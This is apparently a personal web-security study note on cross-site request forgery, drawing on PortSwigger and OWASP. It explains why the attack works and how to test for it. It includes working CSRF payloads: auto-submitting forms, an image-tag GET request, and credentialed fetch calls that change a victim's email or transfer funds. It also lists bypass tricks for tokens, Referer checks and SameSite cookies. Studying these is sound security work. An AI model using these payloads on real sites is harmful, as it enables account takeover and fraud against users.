# CSRF — Cross-Site Request Forgery

← [[A01-Broken-Access-Control]]

---

CSRF tricks a logged-in user into unknowingly submitting a request to a vulnerable site. The browser sends cookies automatically — so the forged request arrives fully authenticated.

---

## The Core Idea

```
1. Victim is logged into bank.com
2. Victim visits evil.com (in another tab or from a phishing link)
3. evil.com contains: <form action="https://bank.com/transfer" method="POST">
                        <input name="amount" value="5000">
                        <input name="to" value="attacker">
                      </form>
                      <script>document.forms[0].submit()</script>
4. Browser submits the form to bank.com WITH the victim's cookies
5. bank.com sees a valid authenticated request and transfers the money
```

The attacker doesn't need to read the response — just trigger the action.

---

## Why It Works

The browser's Same-Origin Policy restricts **reading** cross-origin responses, but not **sending** cross-origin requests. Cookies are attached automatically.

See [[Same-Origin-Policy]] for the full breakdown.

---

## What Makes a CSRF Vulnerable

An endpoint is vulnerable to CSRF when:
1. It performs a state-changing action (not just reading data)
2. It relies solely on cookies for authentication
3. It doesn't use CSRF tokens, `SameSite` cookies, or Origin/Referer checks

---

## Simple CSRF (GET-Based)

If a state-changing action uses GET:

```html
<!-- victim just needs to load this URL — doesn't even need to click -->
<img src="https://bank.com/transfer?amount=5000&to=attacker">
```

This is very easy to exploit. GET requests should never change state (see [[HTTP-Methods]]).

---

## Form-Based CSRF (POST)

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://vulnerable.com/change-email" method="POST">
      <input name="email" value="attacker@evil.com">
    </form>
  </body>
</html>
```

Host this on attacker.com. When the victim visits, their browser auto-submits the form to vulnerable.com using their session cookie.

---

## AJAX/JSON CSRF

Modern apps use JSON APIs. CSRF is trickier but not impossible.

**With `Content-Type: application/json`:** The browser sends a CORS preflight for this — harder to CSRF. But:

```javascript
// If the server accepts application/x-www-form-urlencoded in place of JSON:
fetch('https://vulnerable.com/api/update', {
  method: 'POST',
  body: 'email=attacker@evil.com',
  credentials: 'include'
})

// Or if CORS is misconfigured to allow the attacker's origin:
fetch('https://vulnerable.com/api/update', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
})
```

---

## CSRF Defenses and How to Bypass Them

### CSRF Tokens

```html
<input type="hidden" name="csrf_token" value="r4nd0m_t0k3n">
```

The server issues a unique token per session/request. The attacker can't guess it from a different origin.

**Bypass attempts:**
- Remove the token entirely — does the server check if it's present? `csrf_token=`
- Use another user's valid CSRF token — some apps only check format, not session binding
- Change POST to GET — CSRF token only validated on POST?
- Check if the token is in a predictable format (timestamp, username hash)

### `Referer` / `Origin` Header Check

```
Referer: https://trusted.com/legitimate-page
Origin: https://trusted.com
```

**Bypasses:**
- Remove the header entirely — does the app allow absent `Referer`?
- Set `Referer` to a URL containing the target domain: `https://attacker.com?x=target.com`
- Some apps do a startsWith or contains check

### `SameSite` Cookie Attribute

```
Set-Cookie: session=abc; SameSite=Strict
```

- `SameSite=Strict` — never sent in cross-site requests. CSRF fully blocked.
- `SameSite=Lax` — sent on top-level navigations (GET link clicks) but not sub-requests. Most CSRF blocked. But:
  - GET-based CSRF still works (clicking a link is top-level navigation)
  - If the state-changing action accepts GET (misconfiguration), Lax doesn't protect it
- `SameSite=None` — always sent. No CSRF protection.

> [!NOTE]
> Chrome defaults `SameSite=Lax` for cookies that don't explicitly set the attribute. This has significantly reduced CSRF in modern apps. But it's not universal — check the actual flag on each cookie.

---

## Testing CSRF

```
1. Find a state-changing action (change email, password, add user, make payment)
2. Capture the request in Burp
3. Right-click → "Engagement tools" → "Generate CSRF PoC"
4. Remove or modify the CSRF token
5. Open the PoC in a browser while logged in
6. Did the action execute?
```

**Quick check — is the token actually validated?**
```http
# Original request:
POST /change-email
csrf_token=validtoken123&email=original@test.com

# Test 1: Remove token entirely
POST /change-email
email=new@attacker.com

# Test 2: Use empty token
POST /change-email
csrf_token=&email=new@attacker.com

# Test 3: Use random string
POST /change-email
csrf_token=aaaaaaaaaa&email=new@attacker.com
```

If any of these succeed, CSRF protection is broken.

---

## Impact

CSRF impact equals the impact of the action it forges:
- Change email → account takeover (reset password to new email)
- Change password → direct account takeover
- Transfer funds → financial loss
- Add admin user → privilege escalation
- Delete account → denial of service

---

*Related: [[Same-Origin-Policy]] | [[Browser-Security-Model]] | [[A01-Broken-Access-Control]]*

*Sources: PortSwigger Web Security Academy, OWASP CSRF Cheat Sheet*
